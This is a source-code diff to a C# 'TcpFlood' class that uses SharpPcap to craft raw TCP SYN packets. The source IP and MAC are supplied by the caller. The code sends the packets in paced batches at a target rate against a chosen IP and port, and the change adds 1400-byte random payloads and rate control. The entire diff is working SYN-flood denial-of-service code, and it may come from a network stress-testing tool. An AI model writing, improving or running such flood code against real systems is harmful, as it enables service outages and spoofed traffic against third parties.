@@ -7,6 +7,9 @@ using NLog;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
+using System.Buffers;
+using System.Runtime.InteropServices;
+using System.Net.Sockets;
 
 namespace Dorothy.Models
 {
@@ -21,7 +24,7 @@ namespace Dorothy.Models
         private readonly long _bytesPerSecond;
         private readonly CancellationToken _cancellationToken;
         private LibPcapLiveDevice? _device;
-        private readonly Random _random = new Random();
+        private static readonly ArrayPool<byte> PacketPool = ArrayPool<byte>.Shared;
 
         public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
         {
@@ -67,40 +70,52 @@ namespace Dorothy.Models
                     IPAddress.Parse(_sourceIp),
                     IPAddress.Parse(_targetIp))
                 {
-                    Protocol = ProtocolType.Tcp,
+                    Protocol = PacketDotNet.ProtocolType.Tcp,
                     TimeToLive = 128
                 };
 
                 var tcpPacket = new TcpPacket(
-                    6819, // Fixed source port
+                    6819,
                     (ushort)_targetPort)
                 {
-                    Flags = 0x02, // SYN flag
+                    Flags = 0x02,
                     WindowSize = 8192,
                     SequenceNumber = 0,
-                    PayloadData = new byte[0]
+                    PayloadData = new byte[1400]
                 };
 
+                new Random().NextBytes(tcpPacket.PayloadData);
                 ipPacket.PayloadPacket = tcpPacket;
                 ethernetPacket.PayloadPacket = ipPacket;
 
-                const int FULL_PACKET_SIZE = 54; // Ethernet (14) + IP (20) + TCP (20) = 54 bytes
-                long packetsNeededPerSecond = _bytesPerSecond / FULL_PACKET_SIZE;
-                int batchSize = 10000;
-                // No delay - we want to send as fast as possible to achieve target rate
+                double packetSize = ethernetPacket.Bytes.Length;
+                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
+                int batchSize = 1000;
+                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
 
-                Logger.Info($"TCP SYN Flood: Target rate {_bytesPerSecond / 125_000} Mbps " +
-                           $"({packetsNeededPerSecond} packets/sec, {batchSize} batch size)");
+                Logger.Info($"TCP SYN Flood: Target rate {_bytesPerSecond / 125_000} Mbps ({packetsPerSecond} packets/sec, {batchSize} batch size)");
 
                 await Task.Run(() =>
                 {
+                    var stopwatch = new System.Diagnostics.Stopwatch();
                     while (!_cancellationToken.IsCancellationRequested)
                     {
                         try
                         {
+                            stopwatch.Restart();
                             for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                             {
-                                injectionDevice.SendPacket(ethernetPacket);
+                                (_device as IInjectionDevice).SendPacket(ethernetPacket);
+                            }
+
+                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
+                            if (elapsedMicroseconds < delayMicroseconds)
+                            {
+                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
+                                if (remainingMicroseconds > 1000)
+                                {
+                                    Thread.Sleep(remainingMicroseconds / 1000);
+                                }
                             }
                         }
                         catch (Exception ex)
@@ -114,11 +129,6 @@ namespace Dorothy.Models
             catch (TaskCanceledException)
             {
                 Logger.Info("TCP SYN Flood attack was canceled.");
-            }
-            catch (Exception ex)
-            {
-                Logger.Error(ex, "TCP SYN Flood attack failed.");
-                throw;
             }
             finally
             {
